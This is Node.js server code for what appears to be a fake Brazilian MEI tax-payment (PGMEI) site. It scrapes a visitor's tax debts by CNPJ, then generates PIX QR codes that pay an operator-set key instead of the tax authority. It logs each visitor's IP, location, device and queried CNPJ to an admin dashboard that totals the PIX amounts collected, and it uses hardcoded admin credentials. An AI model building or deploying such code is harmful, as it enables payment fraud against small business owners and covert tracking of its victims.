require('dotenv').config();
const express = require('express');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const session = require('express-session');
const Database = require('better-sqlite3');
const QRCode = require('qrcode');
const fs = require('fs');
const { wrapper } = require('axios-cookiejar-support');
const { CookieJar } = require('tough-cookie');

const app = express();
const PORT = process.env.PORT || 3000;

if (!fs.existsSync('data')) fs.mkdirSync('data');
const db = new Database('data/pgmei.db');

db.exec(`
  CREATE TABLE IF NOT EXISTS acessos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT, user_agent TEXT, dispositivo TEXT, navegador TEXT, sistema TEXT,
    pais TEXT, cidade TEXT, regiao TEXT, cnpj_consultado TEXT,
    criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS pix_gerados (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cnpj TEXT, nome TEXT, valor REAL, periodos TEXT,
    txid TEXT, payload TEXT,
    criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS config (
    chave TEXT PRIMARY KEY,
    valor TEXT
  );
`);

db.prepare(`INSERT OR IGNORE INTO config (chave, valor) VALUES ('pix_chave', '')`).run();
db.prepare(`INSERT OR IGNORE INTO config (chave, valor) VALUES ('pix_nome', 'RECEBEDOR')`).run();
db.prepare(`INSERT OR IGNORE INTO config (chave, valor) VALUES ('pix_cidade', 'SAO PAULO')`).run();

function getConfig(chave) {
  const r = db.prepare('SELECT valor FROM config WHERE chave = ?').get(chave);
  return r ? r.valor : '';
}
function setConfig(chave, valor) {
  db.prepare('INSERT OR REPLACE INTO config (chave, valor) VALUES (?, ?)').run(chave, valor || '');
}

app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));
app.use(session({
  secret: 'pgmei-firma-2026-secret-xpto',
  resave: false, saveUninitialized: false,
  cookie: { maxAge: 24 * 60 * 60 * 1000 },
}));

function detectarDispositivo(ua) {
  ua = ua || '';
  if (/mobile|android|iphone|ipad|ipod|blackberry|opera mini|iemobile/i.test(ua)) {
    if (/ipad|tablet/i.test(ua)) return 'Tablet';
    return 'Celular';
  }
  return 'Desktop';
}
function detectarNavegador(ua) {
  ua = ua || '';
  if (/edg\//i.test(ua)) return 'Edge';
  if (/chrome/i.test(ua) && !/edg/i.test(ua)) return 'Chrome';
  if (/firefox/i.test(ua)) return 'Firefox';
  if (/safari/i.test(ua) && !/chrome/i.test(ua)) return 'Safari';
  if (/opera|opr\//i.test(ua)) return 'Opera';
  return 'Outro';
}
function detectarSistema(ua) {
  ua = ua || '';
  if (/windows/i.test(ua)) return 'Windows';
  if (/mac os/i.test(ua)) return 'macOS';
  if (/linux/i.test(ua)) return 'Linux';
  if (/android/i.test(ua)) return 'Android';
  if (/iphone|ipad|ios/i.test(ua)) return 'iOS';
  return 'Outro';
}
function pegarIP(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return fwd.split(',')[0].trim();
  return req.connection?.remoteAddress || req.socket?.remoteAddress || 'desconhecido';
}
async function geolocalizar(ip) {
  try {
    if (!ip || ip === 'desconhecido' || ip.startsWith('::') || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.')) {
      return { pais: 'Local', cidade: '', regiao: '' };
    }
    const r = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,regionName`, { timeout: 5000 });
    if (r.data && r.data.status === 'success') {
      return { pais: r.data.country || '', cidade: r.data.city || '', regiao: r.data.regionName || '' };
    }
  } catch (e) {}
  return { pais: '', cidade: '', regiao: '' };
}
function registrarAcesso(req, cnpjConsultado) {
  const ip = pegarIP(req);
  const ua = req.headers['user-agent'] || '';
  const disp = detectarDispositivo(ua);
  const nav = detectarNavegador(ua);
  const sis = detectarSistema(ua);
  const info = db.prepare(
    `INSERT INTO acessos (ip, user_agent, dispositivo, navegador, sistema, cnpj_consultado)
     VALUES (?, ?, ?, ?, ?, ?)`
  ).run(ip, ua, disp, nav, sis, cnpjConsultado || null);
  const id = info.lastInsertRowid;
  geolocalizar(ip).then((g) => {
    if (g.pais || g.cidade) {
      db.prepare(`UPDATE acessos SET pais=?, cidade=?, regiao=? WHERE id=?`).run(g.pais, g.cidade, g.regiao, id);
    }
  }).catch(() => {});
}

app.get('/', (req, res) => {
  registrarAcesso(req, null);
  res.sendFile(path.join(__dirname, 'index.html'));
});

const BASE = 'https://pagarmeumei.com/SimplesNacional/Aplicacoes/pgmei.app';
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36';
const MESES = { '01':'Janeiro','02':'Fevereiro','03':'Março','04':'Abril','05':'Maio','06':'Junho','07':'Julho','08':'Agosto','09':'Setembro','10':'Outubro','11':'Novembro','12':'Dezembro' };
const cache = new Map();
const CACHE_MS = 5 * 60 * 1000;

function formatarCNPJ(c) { return c.replace(/^(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})$/, '$1.$2.$3/$4-$5'); }
function formatarPeriodo(p) {
  const m = String(p || '').match(/^(\d{4})(\d{2})$/);
  if (!m) return { ano: '', label: p || '' };
  const [, ano, mes] = m;
  return { ano, label: `${MESES[mes] || mes}/${ano}` };
}
function normalizarDebito(d) {
  const p = formatarPeriodo(d.periodo);
  return {
    ano: p.ano, periodo: p.label,
    situacao: d.situacao_portal || d.status || d.situacao || '',
    principal: d.valor_principal || d.principal || '0.00',
    multa: d.multa || '0.00', juros: d.juros || '0.00',
    total: d.valor_total || d.total || '0.00',
    vencimento: d.vencimento || '', acolhimento: d.acolhimento || '',
  };
}

async function consultarCompleto(cnpj) {
  const cnpjFmt = formatarCNPJ(cnpj);
  const jar = new CookieJar();
  const client = wrapper(axios.create({ jar, withCredentials: true, maxRedirects: 5, validateStatus: (s) => s >= 200 && s < 400, timeout: 60000 }));
  const H = { 'User-Agent': UA, 'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', Origin: 'https://pagarmeumei.com', Referer: `${BASE}/` };
  await client.get(`${BASE}/`, { headers: { ...H, Accept: 'text/html,*/*', 'Upgrade-Insecure-Requests': '1' } });
  const fd = new FormData();
  fd.append('action', 'tudo');
  fd.append('cnpj', cnpjFmt);
  fd.append('cnpj_raw', cnpj);
  const r = await client.post(`${BASE}/api_mei_direto.php`, fd, { headers: { ...H, ...fd.getHeaders(), Accept: 'application/json' } });
  const resp = r.data;
  if (!resp || resp.sucesso === false) throw new Error(resp?.mensagem || 'Falha ao consultar');
  return {
    cnpj: resp.cnpj || cnpjFmt,
    nome: resp.nome || '',
    anos: (resp.anos || []).map(a => String(a.ano)),
    anoInicial: String(resp.ano_inicial || (resp.anos || [])[0]?.ano || ''),
    debitos: (resp.debts || resp.debitos || []).map(normalizarDebito),
  };
}

app.get('/api/consultar/:cnpj', async (req, res) => {
  const cnpj = String(req.params.cnpj || '').replace(/\D/g, '');
  if (cnpj.length !== 14) return res.json({ erro: 'CNPJ inválido.' });
  registrarAcesso(req, cnpj);
  const cached = cache.get(cnpj);
  if (cached && Date.now() - cached.ts < CACHE_MS) return res.json(cached.data);
  try {
    const resposta = await consultarCompleto(cnpj);
    cache.set(cnpj, { ts: Date.now(), data: resposta });
    return res.json(resposta);
  } catch (err) {
    return res.json({ erro: err.message || 'Erro desconhecido' });
  }
});

app.get('/api/pix-status', (req, res) => {
  const chave = getConfig('pix_chave');
  res.json({ tem_chave: !!chave });
});

app.post('/api/gerar-pix', async (req, res) => {
  try {
    const { cnpj, nome, valor, periodos } = req.body;
    if (!cnpj || !valor) return res.json({ erro: 'CNPJ e valor obrigatórios' });

    const chave = getConfig('pix_chave');
    const nomeRec = getConfig('pix_nome') || 'RECEBEDOR';
    const cidadeRec = getConfig('pix_cidade') || 'SAO PAULO';

    if (!chave) return res.json({ erro: 'Chave PIX não configurada no painel.' });

    const valorNum = parseFloat(String(valor).replace(',', '.'));
    if (isNaN(valorNum) || valorNum <= 0) return res.json({ erro: 'Valor inválido' });

    const txid = 'PGMEI' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substring(2, 6).toUpperCase();
    const payload = gerarPixPayload({
      chave, nome: nomeRec, cidade: cidadeRec,
      valor: valorNum, txid,
    });

    const qrDataUrl = await QRCode.toDataURL(payload, {
      errorCorrectionLevel: 'M', margin: 1, width: 300,
      color: { dark: '#000000', light: '#FFFFFF' },
    });

    db.prepare(
      `INSERT INTO pix_gerados (cnpj, nome, valor, periodos, txid, payload)
       VALUES (?, ?, ?, ?, ?, ?)`
    ).run(formatarCNPJ(cnpj.replace(/\D/g, '')), nome || '', valorNum, (periodos || []).join(', '), txid, payload);

    return res.json({
      ok: true, txid, payload, qr_code: qrDataUrl,
      valor: valorNum, chave_pix: chave, nome: nomeRec,
    });
  } catch (e) {
    return res.json({ erro: e.message });
  }
});

// ═══ GERADOR PIX (BR Code EMV) — CONFORME BACEN ═══
function emv(id, value) { const len = String(value.length).padStart(2, '0'); return id + len + value; }

function crc16(str) {
  let crc = 0xFFFF;
  for (let i = 0; i < str.length; i++) {
    crc ^= str.charCodeAt(i) << 8;
    for (let j = 0; j < 8; j++) {
      if ((crc & 0x8000) !== 0) crc = (crc << 1) ^ 0x1021;
      else crc = crc << 1;
      crc &= 0xFFFF;
    }
  }
  return crc.toString(16).toUpperCase().padStart(4, '0');
}

function sanitize(s) {
  return String(s || '')
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, '')
    .replace(/[^a-zA-Z0-9 ]/g, '')
    .replace(/\s+/g, ' ')
    .trim();
}

// ─── Normalização de chave PIX (conforme Bacen) ───
function normalizarChavePIX(chave) {
  if (!chave) return '';
  chave = String(chave).trim();

  // Email
  if (chave.includes('@')) return chave.toLowerCase();

  // Chave aleatória (UUID)
  if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(chave)) {
    return chave.toLowerCase();
  }

  const digitos = chave.replace(/\D/g, '');

  // CNPJ (14 dígitos)
  if (digitos.length === 14) return digitos;

  // Celular brasileiro: 11 dígitos, com DDD válido (11-99) e 3º dígito = 9
  // Ex: 11999999999 → +5511999999999
  if (digitos.length === 11 && digitos[2] === '9') {
    return '+55' + digitos;
  }

  // CPF: 11 dígitos (que não seja celular)
  if (digitos.length === 11) return digitos;

  // Já tem +55
  if (digitos.length === 13 && digitos.startsWith('55')) return '+' + digitos;

  // Fallback
  return chave.toLowerCase();
}

function gerarPixPayload({ chave, nome, cidade, valor }) {
  const chaveLimpa = normalizarChavePIX(chave);
  const nomeLimpo = sanitize(nome).substring(0, 25) || 'RECEBEDOR';
  const cidadeLimpa = sanitize(cidade).substring(0, 15) || 'SAO PAULO';

  // Para PIX estático conforme Bacen: txid deve ser ***
  const txidLimpo = '***';

  const gui = emv('00', 'br.gov.bcb.pix');
  const keyField = emv('01', chaveLimpa);
  const merchantAccount = emv('26', gui + keyField);

  let payload = '';
  payload += emv('00', '01');                 // Payload Format Indicator
  payload += emv('01', '11');                 // Point of Initiation Method: 11 = estático reutilizável
  payload += merchantAccount;                 // Merchant Account Info
  payload += emv('52', '0000');               // Merchant Category Code
  payload += emv('53', '986');                // Moeda: BRL
  payload += emv('54', valor.toFixed(2));     // Valor
  payload += emv('58', 'BR');                 // País
  payload += emv('59', nomeLimpo);            // Nome do recebedor
  payload += emv('60', cidadeLimpa);          // Cidade do recebedor
  payload += emv('62', emv('05', txidLimpo)); // Additional Data Field: txid = ***
  payload += '6304';                          // Placeholder do CRC

  return payload + crc16(payload);
}

// ═══ ADMIN ═══
const ADMIN_USER = 'FIRMA2026';
const ADMIN_PASS = 'FIRMA2026';

function precisaLogin(req, res, next) {
  if (req.session && req.session.admin) return next();
  return res.redirect('/admin/login');
}
function precisaLoginAPI(req, res, next) {
  if (req.session && req.session.admin) return next();
  return res.status(401).json({ erro: 'Não autenticado' });
}

app.get('/admin', (req, res) => {
  if (req.session && req.session.admin) return res.redirect('/admin/painel');
  res.redirect('/admin/login');
});
app.get('/admin/login', (req, res) => res.sendFile(path.join(__dirname, 'login-admin.html')));
app.post('/admin/login', (req, res) => {
  const { user, pass } = req.body;
  if (user === ADMIN_USER && pass === ADMIN_PASS) {
    req.session.admin = true;
    return res.json({ ok: true });
  }
  return res.status(401).json({ erro: 'Usuário ou senha inválidos' });
});
app.get('/admin/logout', (req, res) => { req.session.destroy(); res.redirect('/admin/login'); });
app.get('/admin/painel', precisaLogin, (req, res) => res.sendFile(path.join(__dirname, 'painel.html')));

app.get('/api/admin/stats', precisaLoginAPI, (req, res) => {
  const totalAcessos = db.prepare('SELECT COUNT(*) AS n FROM acessos').get().n;
  const acessosHoje = db.prepare(`SELECT COUNT(*) AS n FROM acessos WHERE DATE(criado_em) = DATE('now')`).get().n;
  const totalPix = db.prepare('SELECT COUNT(*) AS n, COALESCE(SUM(valor), 0) AS total FROM pix_gerados').get();
  const ipUnicos = db.prepare('SELECT COUNT(DISTINCT ip) AS n FROM acessos').get().n;
  const cnpjsConsultados = db.prepare('SELECT COUNT(DISTINCT cnpj_consultado) AS n FROM acessos WHERE cnpj_consultado IS NOT NULL').get().n;
  const dispositivos = db.prepare(`SELECT dispositivo, COUNT(*) AS n FROM acessos GROUP BY dispositivo ORDER BY n DESC LIMIT 5`).all();
  const navegadores = db.prepare(`SELECT navegador, COUNT(*) AS n FROM acessos GROUP BY navegador ORDER BY n DESC LIMIT 5`).all();
  const localizacoes = db.prepare(`SELECT cidade, pais, COUNT(*) AS n FROM acessos WHERE cidade != '' GROUP BY cidade, pais ORDER BY n DESC LIMIT 5`).all();
  res.json({ totalAcessos, acessosHoje, totalPix: totalPix.n, valorPix: totalPix.total, ipUnicos, cnpjsConsultados, dispositivos, navegadores, localizacoes });
});

app.get('/api/admin/acessos', precisaLoginAPI, (req, res) => {
  const limit = Math.min(parseInt(req.query.limit) || 100, 500);
  res.json(db.prepare(`SELECT * FROM acessos ORDER BY id DESC LIMIT ?`).all(limit));
});

app.get('/api/admin/config', precisaLoginAPI, (req, res) => {
  res.json({
    pix_chave: getConfig('pix_chave'),
    pix_nome: getConfig('pix_nome'),
    pix_cidade: getConfig('pix_cidade'),
  });
});

app.post('/api/admin/config', precisaLoginAPI, (req, res) => {
  const { pix_chave, pix_nome, pix_cidade } = req.body;
  if (typeof pix_chave === 'string') setConfig('pix_chave', pix_chave.trim());
  if (typeof pix_nome === 'string') setConfig('pix_nome', pix_nome.trim());
  if (typeof pix_cidade === 'string') setConfig('pix_cidade', pix_cidade.trim());
  res.json({ ok: true });
});

app.get('/api/admin/pix', precisaLoginAPI, (req, res) => {
  res.json(db.prepare(`SELECT * FROM pix_gerados ORDER BY id DESC LIMIT 200`).all());
});

app.listen(PORT, () => {
  console.log(`✅ Servidor em http://localhost:${PORT}`);
  console.log(`🔒 Painel: http://localhost:${PORT}/admin/login`);
});